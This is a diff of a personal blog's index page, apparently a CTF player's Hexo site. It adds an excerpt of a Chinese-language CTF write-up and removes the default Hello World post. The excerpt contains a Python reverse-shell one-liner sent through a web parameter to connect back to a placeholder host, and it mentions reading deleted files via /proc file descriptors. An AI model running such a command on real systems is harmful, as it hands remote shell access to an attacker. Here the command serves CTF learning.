@@ -101,6 +101,39 @@
         
         
         <div class="col-12 col-md-8 m-auto">
+            <a href="/2020/03/04/V-N-内部考核-wp/">
+                <p class="h4 index-header">V&amp;N_内部考核_wp</p>
+                <div class="index-excerpt">
+                    
+                        <div class="index-text mb-1">WEB 部分HappyCTFd有一说一，一步一步按照这个做：https://www.colabug.com/2020/0204/6940556/amp/
+CheckIn比赛的时候没有打出来，但是留个坑吧，顺便学习一下反弹 shell。
+shell?c=python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip_address&quot;,ip_port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;这道题最重要的知识点这个。
+
+Linux 中 /proc/pid/fd/ 下的 descriptor 文件会指向某个对应正在打开的文件。所以这里离虽然执行了 rm 操作，但是也可以通过 descriptor 来读取文</div>
+                    
+                </div>
+            </a>
+
+            
+                <div>
+                    <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-04
+                    &nbsp;&nbsp;
+                    
+                    
+                        |&nbsp;&nbsp;<i class="iconfont icon-tag"></i>
+                        
+                            <a href="/tags/wp">wp</a>&nbsp;
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+
+    <div class="row mb-4 mx-auto">
+        
+        
+        <div class="col-12 col-md-8 m-auto">
             <a href="/2020/02/04/Web-前端学习/">
                 <p class="h4 index-header">Web_前端学习</p>
                 <div class="index-excerpt">
@@ -512,40 +545,18 @@ s1 * k ≡ </div>
         </div>
     </div>
 
-    <div class="row mb-4 mx-auto">
-        
-        
-        <div class="col-12 col-md-8 m-auto">
-            <a href="/2019/08/27/hello-world/">
-                <p class="h4 index-header">Hello World</p>
-                <div class="index-excerpt">
-                    
-                        <div class="index-text mb-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick StartCreate a new post$ hexo new &quot;My New Post&quot;
-More info: Writing
-Run server$ hexo server
-More info: Server
-Generate static files$ hexo generate
-More info: Generating
-Deploy to remote sites$ hexo deploy
-More info: Deployment
-</div>
-                    
-                </div>
-            </a>
-
-            
-                <div>
-                    <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-27
-                    &nbsp;&nbsp;
-                    
-                    
-                </div>
-            
-        </div>
-    </div>
 
 
+<nav aria-label="index posts navigation">
+<ul class="pagination pg-blue justify-content-center mt-5">
+    
+    
+        <li class="page-item">
+        <a class="page-link" href="/page/2/">Next</a>
+        </li>
+    
+</ul>
+</nav>
 
                         </div>
                     </div>
